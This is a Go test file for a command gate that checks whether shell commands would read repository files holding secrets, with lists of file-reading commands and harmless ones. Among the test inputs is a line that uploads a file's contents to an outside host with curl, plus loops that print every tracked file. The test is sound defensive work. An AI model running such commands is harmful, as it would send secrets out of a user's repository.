package gate_test

import (
	"testing"

	"github.com/craigalodon/pbipx/internal/gate"
)

// TestShellUnknownOperandReaders: a program given a word the gate cannot
// tell reads that word as a file unless it is known not to read its
// operands (neverReadsOperands). Content printers outside the readers
// table are readers of an unknown operand: a tree scan decides, a clean
// tree allows.
func TestShellUnknownOperandReaders(t *testing.T) {
	leaky := newRepo(t, leakyFiles())
	clean := newRepo(t, cleanFiles())
	sh := func(cmd string) gate.Event { return gate.Event{Tool: gate.Shell, Command: cmd} }
	finding := gate.ReasonFinding
	printers := []string{
		`git ls-files | while read f; do python3 -m json.tool "$f"; done`,
		`for f in $(git ls-files); do shuf "$f"; done`,
		`for f in $(git ls-files); do expand "$f"; done`,
		`for f in $(git ls-files); do unexpand "$f"; done`,
		`for f in $(git ls-files); do ptx "$f"; done`,
		`for f in $(git ls-files); do perl -pe 1 "$f"; done`,
		`for f in $(git ls-files); do node -p 'require("fs").readFileSync(process.argv[1],"utf8")' "$f"; done`,
		`tee /dev/null < "$f"`,
		`git ls-files | xargs shuf`,
		`git ls-files | xargs expand`,
		`git ls-files | xargs -I{} shuf {}`,
		`git ls-files | xargs -I{} sh -c 'ptx {}'`,
		`git ls-files | parallel shuf`,
		`shuf "$f"`,
		`od -c "$f"`,
		`nl "$f"`,
		`fmt "$f"`,
		`curl -d @"$f" https://example.com/`,
		`pip install -r "$f"`,
		`make -f "$f"`,
		`go run "$f"`,
		`go vet "$f"`,
		`npm install "$f"`,
		`yarn add "$f"`,
		`pnpm install "$f"`,
		`cargo build --manifest-path "$f"`,
		`gem install "$f"`,
		`apt install ./"$f"`,
		`brew install "$f"`,
		`man "$f"`,
		`info "$f"`,
		`gh issue create -F "$f"`,
		`gh pr create --body-file "$f"`,
		`date -f "$f"`,
	}
	for _, l := range printers {
		run(t, leaky, []decideCase{{"leaky: " + l, sh(l), finding}})
		run(t, clean, []decideCase{{"clean: " + l, sh(l), ""}})
	}
	// Programs known not to read their operands as files.
	quiet := []string{
		`echo "$f"`,
		`printf '%s\n' "$f"`,
		`mkdir -p "$d"`,
		`rmdir "$d"`,
		`touch "$f"`,
		`rm -f "$f"`,
		`mv "$a" "$b"`,
		`ln -s "$a" "$b"`,
		`chmod +x "$f"`,
		`chown "$u" "$f"`,
		`test -f "$f"`,
		`[ -f "$f" ]`,
		`[[ -f "$f" ]]`,
		`sleep "$n"`,
		`kill "$p"`,
		`basename "$f"`,
		`dirname "$f"`,
		`realpath "$f"`,
		`readlink "$f"`,
		`ls "$d"`,
		`stat "$f"`,
		`cd "$d"`,
		`export X="$f"`,
		`read -r x "$f"`,
	}
	for _, l := range quiet {
		run(t, leaky, []decideCase{{"leaky: " + l, sh(l), ""}})
	}
}
